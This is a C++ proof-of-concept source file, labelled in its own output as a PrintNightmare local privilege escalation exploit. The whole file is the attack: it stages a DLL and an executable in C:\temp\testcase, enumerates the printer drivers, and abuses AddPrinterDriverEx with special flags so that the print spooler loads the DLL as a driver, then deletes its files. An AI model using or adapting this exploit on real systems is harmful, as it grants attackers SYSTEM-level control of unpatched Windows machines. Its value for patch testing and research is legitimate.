#include <windows.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <wchar.h>
#include <strsafe.h>
#include <tchar.h>>


#define BUFSIZE 4096
#define PATH_MAX 260

using namespace std;


int wmain(int argc, wchar_t** argv)
{


	CreateDirectoryW(L"c:\\temp\\testcase", NULL);

	CopyFileW(L"vlib.dll", L"C:\\temp\\testcase\\vlib.dll", true);

	CopyFileW(L"xconsole.exe", L"C:\\temp\\testcase\\xconsole.exe", true);

	const WCHAR testFileName[] = { L"C:\\temp\\testcase\\vlib.dll" };
	WCHAR src_exp_path[0x200] = { 0 };
	wsprintf(src_exp_path, L"%s", testFileName);


	DRIVER_INFO_2 info;
	info.cVersion = 3;
	info.pConfigFile = src_exp_path;
	info.pDataFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
	info.pDriverPath = NULL;
	info.pEnvironment = NULL;
	info.pName = (LPWSTR)L"123";

	//Enum
	LPBYTE pinfo = NULL;
	DWORD pcbNeeded;
	DWORD numDriversExist;

	printf("[+] PrintNightmare Local Privilege Escalation POC by @404death\n");
	printf("[+] Found pDriverPath .\n");

	//[enumerates installed drivers]
	EnumPrinterDriversW(NULL,
		NULL,
		2,
		NULL,
		0,
		&pcbNeeded,
		&numDriversExist
	);
	printf("[+] Drivers Count: %d\n", numDriversExist);

	try {
		pinfo = (LPBYTE)malloc(pcbNeeded);
	}
	catch (char* e) {
		pinfo = NULL;
		printf("[-] Exception raised: %s\n", e);
	}

	//[Start find Printer Driver]
	BOOL ok = EnumPrinterDriversW(NULL,
		NULL,
		2,
		pinfo,
		pcbNeeded,
		&pcbNeeded,
		&numDriversExist
	);

	if (ok != 1)
	{
		printf("[-] Find Printer Driver ERR: %d\n", ok);
	}

	printf("[+] find Printer Driver ok.\n");

	DRIVER_INFO_6W* foundInfo = (DRIVER_INFO_6W*)pinfo;


	wprintf(L"[+] Found DriverPath.\n");
	wprintf(L"[+] Found DefaultDataType.\n");
	wprintf(L"[+] Found szHardwareID.\n");


	info.pDriverPath = foundInfo->pDriverPath;


	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

	WCHAR cmdLine4[BUFSIZE];
	ZeroMemory(cmdLine4, BUFSIZE);
	StringCchCat(cmdLine4, BUFSIZE, L"cmd /c start C:\\temp\\testcase\\xconsole.exe");//  > nul 2>&1

	CreateProcess(nullptr, cmdLine4, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	Sleep(1000);

	printf("[+] Tryin' to launch xconsole !!!\n");
	DWORD hr = AddPrinterDriverEx(NULL,
		2,
		(PBYTE)&info,
		APD_COPY_ALL_FILES | 0x10 | 0x8000
	);
	printf("[+] AddPrinterDriverEx %d\n", hr);

	if (hr == 1)
	{
		printf("[+] Done !!! All finished.\n");
		DeleteFileW(L"C:\\temp\\testcase\\vlib.dll");
		DeleteFileW(L"C:\\temp\\testcase\\xconsole.exe");
		RemoveDirectoryW(L"C:\\temp\\testcase");
	}
	else {
		printf("[-] AddPrinterDriverEx%d \n", hr);
	}

	return 0;
}